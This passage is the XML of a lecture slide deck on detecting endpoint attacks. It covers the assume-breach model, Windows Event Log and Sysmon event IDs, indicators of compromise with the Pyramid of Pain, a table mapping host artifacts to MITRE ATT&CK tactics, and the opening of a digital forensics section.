          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>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Detecting Device Attacks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19</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Endpoint Telemetry, Indicators of Compromise, and Digital Forensics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Detection Backstop &amp; Assume Breach</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Assume Breach</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> model (NIST SP 800-207 Zero Trust Architecture) assumes that an adversary has already bypassed network and host perimeters, focusing security efforts on rapid detection, containment, and continuous monitoring.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Detection Backstop &amp; Assume Breach (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_assume_breach_mindset.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Assume Breach model: when prevention controls fail, behavioral monitoring and continuous detection become the primary defense layer.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Detection Backstop &amp; Assume Breach (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rounded Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="5192677" cy="172259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Limitations of Prevention</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="1730000"/>
            <a:ext cx="5072677" cy="12725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Zero-Day Exploits:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Vulnerabilities with no available vendor patches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Credential Abuse:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Valid credentials used by unauthorized actors, which do not trigger access violations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Living off the Land:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Adversaries using built-in system administration tools (e.g., PowerShell, WMI) to blend in with normal administrative activity.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="1330000"/>
            <a:ext cx="5192677" cy="172259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Detection Objectives</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="1730000"/>
            <a:ext cx="5072677" cy="12725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Dwell Time Reduction:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Minimizing the time an attacker remains undetected on a system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Behavioral Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identifying anomalies in process execution and network connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Forensic Readiness:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Maintaining system logs to support post-incident investigations.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="3182674"/>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Collect:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Continuously gather endpoint telemetry, process creation, network connections, registry changes, via Sysmon and Windows Event Logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detect:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identify anomalous behavioral patterns by correlating telemetry against known MITRE ATT&amp;CK tactics and techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Alert:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Trigger SIEM correlation rules and notify SOC analysts when behavioral thresholds are exceeded.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Analyze:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Validate the alert, determine scope of affected hosts, and classify incident severity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Respond:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Escalate to the CSIRT and execute containment procedures per the Incident Response Plan.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Endpoint Telemetry &amp; Log Sources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Endpoint Telemetry</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is the continuous collection and analysis of host-level data, including process executions, network socket connections, file modifications, and registry changes.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Endpoint Telemetry &amp; Log Sources (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_endpoint_telemetry_architecture.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Endpoint telemetry pipeline: raw OS events flow from Windows Event Logs and Sysmon into a SIEM for centralized correlation and alerting.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Endpoint Telemetry &amp; Log Sources (3/3)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Windows Event Log Architecture</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Security Log:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Records authentication events (Event ID 4624 for successful logons, 4625 for failed logons).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System Log:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Tracks driver loads, hardware events, and system services (Event ID 7045 for new service installations).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Application Log:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Records events generated by installed software and database engines.</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Microsoft Sysmon (System Monitor)</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Process Creation (ID 1):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Captures the command line, parent process, and file hashes of new processes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Connections (ID 3):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Logs TCP/UDP connections initiated by local processes, including source/destination IPs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Registry Modification (ID 12/13):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Records changes to system startup keys used for persistence.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Indicators of Compromise (IOCs)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t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Indicator of Compromise (IOC)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is forensic evidence indicating that a system or network has been breached. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>David Bianco's Pyramid of Pain</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> illustrates the difficulty attackers face when different indicators are defended.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Indicators of Compromise (IOCs) (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_pyramid_of_pain.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Pyramid of Pain: indicators higher on the pyramid impose progressively greater cost on attackers when defenders act on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Indicators of Compromise (IOCs) (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="9427344a3ad3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4701351" y="1330000"/>
            <a:ext cx="171376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David Bianco's Pyramid of Pain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Host-Based Indicators of Compromise</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_host_ioc_indicators.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Host-based IOCs mapped to the MITRE ATT&amp;CK framework: each event category surfaces a specific adversary tactic.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Host-Based Indicators of Compromise (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="1330000"/>
          <a:ext cx="10555354" cy="2329890"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Artifact Category</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Windows Event ID / Source</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Suspicious Behavior</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK Tactic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Process Creation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon ID 1 / Security 4688</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Non-standard parent processes (e.g., </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>cmd.exe</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> spawned by </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>winword.exe</a:t>
                      </a:r>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Execution (TA0002)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Account Creation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security Event ID 4720</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Administrative accounts created outside maintenance windows.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistence (TA0003)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Registry Modification</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon ID 12 / 13</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Executables registered in registry Run keys (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</a:t>
                      </a:r>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Persistence (TA0003)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Service Installation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>System Event ID 7045</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Installation of kernel-mode drivers or administrative services.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Privilege Escalation (TA0004)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="388315">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Log Clearing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security Event ID 1102</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>The Security Event Log being cleared by an administrator account.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Defense Evasion (TA0005)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Forensics Mindset &amp; Evidence Volatility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Digital forensics requires a structured methodology to preserve, acquire, and analyze digital evidence. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RFC 3227</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> defines the guidelines for evidence collection, establishing the </a:t>
            </a:r>
            <a:r>
